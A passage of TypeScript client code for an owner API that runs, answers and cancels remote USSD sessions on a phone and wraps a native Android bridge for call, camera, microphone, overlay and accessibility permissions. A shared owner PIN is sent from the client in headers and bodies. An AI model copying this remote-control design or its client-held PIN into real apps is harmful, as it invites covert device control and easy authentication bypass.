        ...signal,
      }),
    },
    4500
  );
  if (!res.ok) return null;
  const data = await res.json().catch(() => null);
  return data?.callSession || null;
}

// ---------- Standalone Remote USSD (No Screen Cast Required) ----------

export async function fetchRemoteUssdTaskClient(
  deviceId: string,
  asOperator = false
): Promise<RemoteUssdTask | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const myId = getOrCreateOwnerDeviceId();
  try {
    const res = await fetchWithTimeout(
      `${baseUrl}/api/owner/ussd?deviceId=${encodeURIComponent(deviceId)}`,
      {
        method: 'GET',
        headers: asOperator ? { 'x-owner-pin': OWNER_PIN } : { 'x-device-id': myId },
        cache: 'no-store',
      },
      3500
    );
    if (!res.ok) return null;
    const data = await res.json().catch(() => null);
    return data?.remoteUssdTask || null;
  } catch {
    return null;
  }
}

export async function startRemoteUssdTaskClient(
  deviceId: string,
  code: string,
  requestedBy: 'app_0069' | 'ram_control' = 'app_0069'
): Promise<RemoteUssdTask> {
  const baseUrl = getOwnerApiBaseUrl();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/ussd`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-owner-pin': OWNER_PIN,
      },
      body: JSON.stringify({
        action: 'run',
        deviceId,
        code,
        requestedBy,
        ownerPin: OWNER_PIN,
      }),
    },
    4500
  );
  const data = await res.json();
  if (!res.ok || !data?.success || !data?.remoteUssdTask) {
    throw new Error(data?.error || 'Failed to queue remote USSD');
  }
  return data.remoteUssdTask;
}

export async function replyRemoteUssdTaskClient(
  deviceId: string,
  requestId: string,
  replyText: string
): Promise<RemoteUssdTask | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/ussd`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-owner-pin': OWNER_PIN,
      },
      body: JSON.stringify({
        action: 'reply',
        deviceId,
        requestId,
        replyText,
        ownerPin: OWNER_PIN,
      }),
    },
    3500
  );
  if (!res.ok) return null;
  const data = await res.json().catch(() => null);
  return data?.remoteUssdTask || null;
}

export async function cancelRemoteUssdTaskClient(
  deviceId: string,
  requestId: string,
  asOperator = false
): Promise<RemoteUssdTask | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const myId = getOrCreateOwnerDeviceId();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/ussd`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...(asOperator ? { 'x-owner-pin': OWNER_PIN } : { 'x-device-id': myId }),
      },
      body: JSON.stringify({
        action: 'cancel',
        deviceId,
        requestId,
        ...(asOperator ? { ownerPin: OWNER_PIN } : {}),
      }),
    },
    3500
  ).catch(() => null);
  if (!res || !res.ok) return null;
  const data = await res.json().catch(() => null);
  return data?.remoteUssdTask || null;
}

export async function clearRemoteUssdTaskClient(deviceId: string): Promise<void> {
  const baseUrl = getOwnerApiBaseUrl();
  await fetchWithTimeout(
    `${baseUrl}/api/owner/ussd`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-owner-pin': OWNER_PIN,
      },
      body: JSON.stringify({
        action: 'clear',
        deviceId,
        ownerPin: OWNER_PIN,
      }),
    },
    3500
  ).catch(() => {});
}

export async function pushClientRemoteUssdUpdate(
  deviceId: string,
  payload: {
    requestId: string;
    status: RemoteUssdStatus;
    screenText?: string;
    hasInput?: boolean;
    detail?: string;
    appliedReplySeq?: number;
  }
): Promise<RemoteUssdTask | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const myId = getOrCreateOwnerDeviceId();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/ussd`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-device-id': myId,
      },
      body: JSON.stringify({
        action: 'client_update',
        deviceId,
        ...payload,
      }),
    },
    3500
  ).catch(() => null);
  if (!res || !res.ok) return null;
  const data = await res.json().catch(() => null);
  return data?.remoteUssdTask || null;
}

// ---------- Native Android Call & Permission Bridge Wrappers ----------

export interface NativePermissionStatus {
  microphone: boolean;
  camera: boolean;
  phone: boolean;
  notifications: boolean;
  overlay: boolean;
  accessibility?: boolean;
  allGranted: boolean;
  sdkInt: number;
}

export type NativePermissionSettingKind =
  | 'overlay'
  | 'notifications'
  | 'accessibility'
  | 'microphone'
  | 'camera'
  | 'phone'
  | 'app';

export function isNativeCallBridgeAvailable(): boolean {
  if (typeof window === 'undefined') return false;
  return Boolean((window as any).Android?.registerCallDevice);
}

export function getNativePermissionStatus(): NativePermissionStatus | null {
  if (typeof window === 'undefined') return null;
  try {
    const androidAny = (window as any).Android;
    if (typeof androidAny?.getPermissionStatusJson === 'function') {
      const raw = String(androidAny.getPermissionStatusJson() || '').trim();
      if (!raw) return null;
      const parsed = JSON.parse(raw);
      return {
        microphone: Boolean(parsed.microphone),
        camera: Boolean(parsed.camera),
        phone: Boolean(parsed.phone),
        notifications: Boolean(parsed.notifications),
        overlay: Boolean(parsed.overlay),
        accessibility:
          parsed.accessibility === undefined ? true : Boolean(parsed.accessibility),
        allGranted: Boolean(parsed.allGranted),
        sdkInt: Number(parsed.sdkInt) || 0,
      };
    }
  } catch {}
  return null;
}

export function openNativePermissionSetting(kind: NativePermissionSettingKind): boolean {
  if (typeof window === 'undefined') return false;
  try {
    const androidAny = (window as any).Android;
    if (typeof androidAny?.openPermissionSetting === 'function') {
      androidAny.openPermissionSetting(kind);
      return true;
    }
  } catch {}
  return false;
}

export function registerNativeCallDevice(): void {
  if (typeof window === 'undefined') return;
  try {
    const androidAny = (window as any).Android;
    if (typeof androidAny?.registerCallDevice === 'function') {
      const deviceId = getOrCreateOwnerDeviceId();
      const baseUrl = getOwnerApiBaseUrl();
      androidAny.registerCallDevice(deviceId, baseUrl);
    }
  } catch {}
}

export function stopNativeCallRinger(): void {
  if (typeof window === 'undefined') return;
  try {
    const androidAny = (window as any).Android;
    if (typeof androidAny?.stopCallRinger === 'function') {
      androidAny.stopCallRinger();
    }
  } catch {}
}

export function requestAllNativeCallPermissions(): boolean {
  if (typeof window === 'undefined') return false;
  try {
    const androidAny = (window as any).Android;
    if (typeof androidAny?.requestCallPermissions === 'function') {
      androidAny.requestCallPermissions();
      return true;
    }
  } catch {}
  return false;
}

export interface PendingNativeCallAction {
  callId: string;
  action: 'answer' | 'decline' | 'open';
  callMode: CallMode;
  ts: number;
}

export function consumePendingNativeCallAction(): PendingNativeCallAction | null {
  if (typeof window === 'undefined') return null;
  try {
    const androidAny = (window as any).Android;
    if (typeof androidAny?.consumePendingCallAction === 'function') {
      const raw = String(androidAny.consumePendingCallAction() || '').trim();
      if (!raw) return null;
      const parsed = JSON.parse(raw);
      if (parsed && typeof parsed.action === 'string') {
        return {
          callId: String(parsed.callId || ''),
          action:
            parsed.action === 'answer'
              ? 'answer'
              : parsed.action === 'decline'
                ? 'decline'
                : 'open',
          callMode: parsed.callMode === 'video' ? 'video' : 'audio',
          ts: Number(parsed.ts) || Date.now(),
        };
      }
    }
  } catch {}
  return null;
}

export function setNativeAudioMode(active: boolean, speakerOn = true): void {
  if (typeof window === 'undefined') return;
  try {
    const win = window as unknown as {
      Android?: { setAudioCallMode?: (active: boolean, speakerOn: boolean) => void };
      RamAudioBridge?: { setAudioCallMode?: (active: boolean, speakerOn: boolean) => void };
    };
    if (typeof win.Android?.setAudioCallMode === 'function') {
      win.Android.setAudioCallMode(Boolean(active), Boolean(speakerOn));
    }
    if (typeof win.RamAudioBridge?.setAudioCallMode === 'function') {
      win.RamAudioBridge.setAudioCallMode(Boolean(active), Boolean(speakerOn));
    }
  } catch {}
}



